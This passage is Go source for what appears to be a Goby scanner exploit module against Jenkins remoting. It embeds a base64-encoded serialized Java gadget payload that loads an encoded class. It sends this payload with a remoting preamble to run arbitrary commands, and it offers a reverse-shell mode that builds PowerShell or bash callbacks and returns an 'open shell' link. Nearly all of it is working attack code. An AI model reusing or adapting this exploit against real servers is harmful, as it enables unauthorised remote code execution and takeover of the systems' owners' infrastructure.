Y21WaGJUc0JBQmdvVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0tWWUJBQXgxYzJWRVpXeHBiV2wwWlhJQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwzVjBhV3d2VTJOaGJtNWxjanNCQUFkb1lYTk9aWGgwQVFBREtDbGFBUUFFYm1WNGRBRUFEbWRsZEVWeWNtOXlVM1J5WldGdEFRQUhaR1Z6ZEhKdmVRQWhBRTBBRlFBQUFBQUFBZ0FCQUU0QVR3QUJBRkFBQUFSMkFBWUFEd0FBQXRvcXR3QUJFZ0lTQTdZQUJFd3JCTFlBQlN1NEFBYTJBQWROTExZQUNCSUp0Z0FFVENzRXRnQUZLeXkyQUFkTkxNQUFDc0FBQ2s0RE5nUVZCQzIrb2dLVUxSVUVNam9GR1FYSEFBYW5Bb0FaQmJZQUNCSUx0Z0FFVENzRXRnQUZLeGtGdGdBSFRTekdBS0VzdGdBSXRnQU1FZzIyQUE2WkFKSXNPZ1laQnJZQUNCSVBBYllBRURvSEdRY1pCZ0cyQUJGTkxMWUFDQklTQkwwQUUxa0RFaFJUdGdBUU9nY1pCeXdFdlFBVldRTVNGbE8yQUJIQUFCUTZDTHNBRjFtM0FCZ1NHYllBR2lvWkNMWUFHN1lBR3JZQUhEb0pHUWEyQUFnU0hRUzlBQk5aQXhJVVU3WUFFRG9IR1FjWkJnUzlBQlZaQXhJZVU3WUFFY0FBSHpvS0dRb1pDYllBSUtjQnpTekdBTGNzdGdBSXRnQU1FaUcyQUE2WkFLZ3N0Z0FJRWlJQnRnQWpPZ1laQml3QnRnQVJPZ2NaQjdZQUNCSVBBYllBRURvR0dRWVpCd0cyQUJGTkxMWUFDQklTQkwwQUUxa0RFaFJUdGdBUU9nWVpCaXdFdlFBVldRTVNGbE8yQUJIQUFCUTZDTHNBRjFtM0FCZ1NHYllBR2lvWkNMWUFHN1lBR3JZQUhEb0pHUWUyQUFnU0pBRzJBQkE2QmhrR0dRY0J0Z0FSVFN5MkFBZ1NKUUcyQUJBNkJoa0dMQUcyQUJIQUFCODZDaGtLR1FtMkFDQ25BUlVzeGdFTExMWUFDTFlBREJJbXRnQU9tUUQ4TERvR0dRYTJBQWdTSjdZQUJEb0hHUWNFdGdBRkdRY1pCcllBQnpvSUdRaTJBQWdTS0xZQUJEb0tHUW9FdGdBRkdRb1pDTFlBQnpvSnB3QWdPZ29aQ0xZQUNCSXF0Z0FFT2dzWkN3UzJBQVVaQ3hrSXRnQUhPZ2taQ2JZQUNCSVBBNzBBRTdZQUVCa0pBNzBBRmJZQUVUb0tHUW0yQUFnU0pBTzlBQk8yQUJBWkNRTzlBQlcyQUJFNkN4a0t0Z0FJRWhJRXZRQVRXUU1TRkZPMkFCQVpDZ1M5QUJWWkF4SVdVN1lBRWNBQUZEb01HUXUyQUFnU0t3TzlBQk8yQUJBWkN3TzlBQlcyQUJIQUFDdzZEYnNBRjFtM0FCZ1NHYllBR2lvWkRMWUFHN1lBR3JZQUhEb09HUTBaRHJZQUxiWUFMaGtOdGdBdnB3QUpoQVFCcC8xcnB3QUlUQ3UyQURDeEFBSUI4QUlMQWc0QUtRQUVBdEVDMUFBcEFBSUFVUUFBQVFZQVFRQUFBQTRBQkFBUUFBd0FFUUFSQUJJQUdRQVRBQ01BRkFBb0FCVUFMZ0FXQURZQUZ3QkFBQmdBUmdBWkFFNEFHZ0JaQUJzQVhnQWNBR1VBSFFCNEFCNEFld0FmQUlnQUlBQ1JBQ0VBcFFBaUFMa0FJd0RUQUNRQTZBQWxBUDBBSmdFRUFDY0JCd0FvQVJvQUtRRW1BQ29CTHdBckFUd0FMQUZGQUMwQldRQXVBVzBBTHdHSEFEQUJsQUF4QVowQU1nR3BBRE1CdFFBMEFid0FOUUcvQURZQjBnQTNBZFVBT0FIaEFEa0I1d0E2QWZBQVBRSDhBRDRDQWdBL0Fnc0FSQUlPQUVBQ0VBQkJBaHdBUWdJaUFFTUNLd0JGQWtRQVJnSmRBRWNDZ3dCSUFwOEFTUUs1QUVvQ3d3QkxBc2dBVEFMTEFCY0MwUUJSQXRRQVR3TFZBRkFDMlFCU0FGSUFBQUJ1QUFyL0FEa0FCUWNBVXdjQVZBY0FWUWNBQ2dFQUFQd0FGQWNBVmZzQXVQc0F0LzhBVGdBSkJ3QlRCd0JVQndCVkJ3QUtBUWNBVlFjQVZRY0FWQWNBVlFBQkJ3QlcvQUFjQndCVi93Q2ZBQVVIQUZNSEFGUUhBRlVIQUFvQkFBRC9BQVVBQVFjQVV3QUFRZ2NBVmdRQUFRQlhBRmdBQVFCUUFBQUN1d0FFQUFrQUFBRS9LOFlCT3hJeEs3WUFNcG9CTWhJenVBQTB0Z0ExVFN1MkFEWk1BVTRCT2dRc0VqZTJBRGlaQUVBckVqbTJBRGlaQUNBckVqcTJBRGlhQUJlN0FCZFp0d0FZSzdZQUdoSTd0Z0FhdGdBY1RBYTlBQlJaQXhJV1Uxa0VFanhUV1FVclV6b0Vwd0E5S3hJNXRnQTRtUUFnS3hJNnRnQTRtZ0FYdXdBWFdiY0FHQ3UyQUJvU1BiWUFHcllBSEV3R3ZRQVVXUU1TUGxOWkJCSS9VMWtGSzFNNkJMZ0FRQmtFdGdCQlRyc0FRbGt0dGdCRHR3QkVFa1cyQUVZNkJSa0Z0Z0JIbVFBTEdRVzJBRWluQUFVU01Ub0d1d0JDV1MyMkFFbTNBRVFTUmJZQVJqb0Z1d0FYV2JjQUdCa0d0Z0FhR1FXMkFFZVpBQXNaQmJZQVNLY0FCUkl4dGdBYXRnQWNPZ1laQmpvSExjWUFCeTIyQUVvWkI3QTZCUmtGdGdBd0dRVzJBRXM2QmkzR0FBY3R0Z0JLR1Fhd09nZ3R4Z0FITGJZQVNoa0l2eEpNc0FBRUFLQUJDd0VXQUNrQW9BRUxBUzhBQUFFV0FTUUJMd0FBQVM4Qk1RRXZBQUFBQWdCUkFBQUFmZ0FmQUFBQVZRQU5BRllBRmdCWEFCc0FXQUFkQUZrQUlBQmFBQ2tBV3dBN0FGd0FUd0JlQUdZQVlBQjRBR0VBakFCakFLQUFaZ0NwQUdjQXV3Qm9BTThBYVFEaEFHb0JCd0JyQVFzQWNBRVBBSEVCRXdCckFSWUFiQUVZQUcwQkhRQnVBU1FBY0FFb0FIRUJMQUJ1QVM4QWNBRTFBSEVCT1FCekFUd0FkUUJTQUFBQXhnQU8vZ0JQQndCWkJ3QmFCd0JiRmlVVC9BQXFCd0JjUVFjQVdmOEFMd0FIQndCVEJ3QlpCd0JaQndCYUJ3QmJCd0JjQndCWkFBRUhBRjMvQUFFQUJ3Y0FVd2NBV1FjQVdRY0FXZ2NBV3djQVhBY0FXUUFDQndCZEJ3QlovQUFUQndCWi93QUNBQVVIQUZNSEFGa0hBRmtIQUZvSEFGc0FBUWNBVnYwQUZRY0FWZ2NBV2Y4QUFnQUZCd0JUQndCWkJ3QlpCd0JhQndCYkFBRUhBRjcvQUFrQUNRY0FVd2NBV1FjQVdRY0FXZ2NBV3dBQUFBY0FYZ0FBL3dBQ0FBSUhBRk1IQUZrQUFBQUJBRjhBQUFBQ0FHQT0iOwpjbHogPSBkZWZpbmVDbGFzcyhiYXNlNjREZWNvZGVUb0J5dGUoY29kZSkpOwpjbHoubmV3SW5zdGFuY2UoKTt0AARldmFsdXEAfgAbAAAAAXEAfgAjc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHh1cQB+ABEAAAAuMCwCFG+45jPqJX+obcQh+hSyAgeCUfdzAhQHNQ1hZShm9A/JV5RBFnac2L8H2HQAA0RTQXNyABFqYXZhLmxhbmcuQm9vbGVhbs0gcoDVnPruAgABWgAFdmFsdWV4cAFweHNyADFvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuc2V0Lkxpc3RPcmRlcmVkU2V0/NOe9voc7VMCAAFMAAhzZXRPcmRlcnQAEExqYXZhL3V0aWwvTGlzdDt4cgBDb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLnNldC5BYnN0cmFjdFNlcmlhbGl6YWJsZVNldERlY29yYXRvchEP9GuWFw4bAwAAeHBzcgAVbmV0LnNmLmpzb24uSlNPTkFycmF5XQFUb1woctICAAJaAA5leHBhbmRFbGVtZW50c0wACGVsZW1lbnRzcQB+ABh4cgAYbmV0LnNmLmpzb24uQWJzdHJhY3RKU09O6IoT9PabP4ICAAB4cABzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAXcEAAAAAXQABWFzZGY5eHhzcQB+AB4AAAAAdwQAAAAAeHh0AAdhZGFkYWRhc3EAfgACc3EAfgAFdwQAAAACcQB+ABpxAH4ACXh0AARhc2RmcHg=")
		preamble := []byte("<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=")
		proto := []byte{0x00, 0x00, 0x00, 0x00}
		data := [][]byte{preamble, proto, bodyData}
		var buf bytes.Buffer
		for _, d := range data {
			buf.Write(d)
		}
		cfg.Data = string(buf.Bytes())
		httpclient.DoHttpRequest(hostinfo, cfg)
		wg.Wait()
		return resp, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			// jenkins-framework-goby
			rsp, err := sendPayloadFlag(hostinfo, "echo c5d02b22c015ef97")
			if err != nil {
				return false
			}
			if strings.Contains(rsp.Utf8Html, "c5d02b22c015ef97") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			waitSessionCh := make(chan string)
			if attackType == "cmd" {
				cmd = goutils.B2S(ss.Params["cmd"])
			} else if attackType == "reverse" {
				if goutils.B2S(ss.Params["reverse"]) == "windows" {
					rp, err := godclient.WaitSession("reverse_windows", waitSessionCh)
					if err != nil || len(rp) == 0 {
						expResult.Success = false
						expResult.Output = err.Error()
					} else {
						cmd = godclient.ReverseTCPByPowershell(rp)
					}
				} else {
					rp, err := godclient.WaitSession("reverse_linux", waitSessionCh)
					if err != nil || len(rp) == 0 {
						expResult.Success = false
						expResult.Output = err.Error()
					} else {
						cmd = "bash -c \"" + godclient.ReverseTCPByBash(rp) + "\""
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			if expResult.Success == false && expResult.Output != "" {
				return expResult
			}
			rsp, err := sendPayloadFlag(expResult.HostInfo, cmd)
			if err != nil && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = err.Error()
			} else if strings.Contains(rsp.Utf8Html, "PingThread$Ping") && attackType == "cmd" {
				output := rsp.Utf8Html[strings.LastIndex(rsp.Utf8Html, "hudson.remoting.PingThread$Ping")+len("hudson.remoting.PingThread$Ping"):]
				if strings.Index(output, "\n") > 0 {
					output = output[strings.Index(output, "\n")+len("\n"):]
				}
				expResult.Success = true
				expResult.Output = output
			} else if strings.Contains(rsp.Utf8Html, "PingThread$Ping") && attackType == "reverse" {
				select {
				case webConsoleId := <-waitSessionCh:
					if u, err := url.Parse(webConsoleId); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						expResult.Output = `<br/> <a href="goby://sessions/view?sid=` + strings.Join(u.Query()["id"], "") + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 10):
					expResult.Success = false
					expResult.Output = "反弹失败，请确认目标是否出网"
				}
			} else {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
			}
			return expResult
		},
	))
}
